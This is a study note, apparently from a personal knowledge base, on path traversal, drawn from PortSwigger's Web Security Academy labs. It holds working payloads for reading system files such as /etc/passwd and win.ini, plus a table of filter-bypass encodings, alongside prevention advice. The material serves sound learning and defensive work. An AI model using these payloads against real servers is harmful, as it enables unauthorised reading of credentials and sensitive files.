---
tags: [hacking, web, portswigger, path-traversal]
type: vulnerability-category
source: https://portswigger.net/web-security/file-path-traversal
last-verified: 2026-08-25
---

# Path traversal

## Up
- [[PortSwigger]]

## What it is
Path traversal (a.k.a. directory traversal) lets an attacker read — and sometimes write — arbitrary files on the server by manipulating a filename/path parameter with `../` sequences to escape the intended directory.

## Impact
Reading sensitive files: application source code and configuration, credentials, `/etc/passwd`, and other system files. If the path is used for *writing*, it can lead to arbitrary file write and potentially remote code execution.

## Basic exploitation
A page loads images via a filename parameter:
```
https://insecure-website.com/loadImage?filename=218.png
```
reading `/var/www/images/218.png`. Traversal sequences step up out of that directory:
```
filename=../../../etc/passwd
```
Windows accepts both `/` and `\`:
```
filename=..\..\..\windows\win.ini
```

## Bypassing defenses
When naive filters are in place, common bypasses:

| Defense | Bypass |
|---|---|
| Traversal sequences blocked | Absolute path: `filename=/etc/passwd` |
| `../` stripped non-recursively | Nested sequences: `....//....//....//etc/passwd` (stripping the inner `../` leaves `../`) |
| Blocks literal `../` | URL-encode: `%2e%2e%2f`, or double-encode: `%252e%252e%252f` |
| Blocks encoded too | Non-standard/overlong UTF-8: `..%c0%af`, `..%ef%bc%8f` |
| Path must start in a base folder | Include it then traverse: `filename=/var/www/images/../../../etc/passwd` |
| Path must end in an expected extension | Null byte: `filename=../../../etc/passwd%00.png` |

## Prevention
- Prefer not to pass user input to filesystem APIs at all.
- Validate against an **allow-list** of permitted values, or restrict input to alphanumerics.
- After building the path, **canonicalize** it and verify it still starts with the expected base directory before use (e.g. compare the canonical path prefix).

## Labs
6 labs. Verify exact titles against the live academy page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| File path traversal, simple case | Apprentice | `filename=../../../etc/passwd`. | |
| Traversal sequences blocked with absolute path bypass | Practitioner | Supply an absolute path `/etc/passwd`. | |
| Traversal sequences stripped non-recursively | Practitioner | Use `....//` so one strip leaves a valid `../`. | |
| Traversal sequences stripped with superfluous URL-decode | Practitioner | Double-URL-encode: `%252e%252e%252f`. | |
| Validation of start of path | Practitioner | Keep the required base folder prefix, then traverse out. | |
| Validation of file extension with null byte bypass | Practitioner | Append `%00.png` after `/etc/passwd`. | |
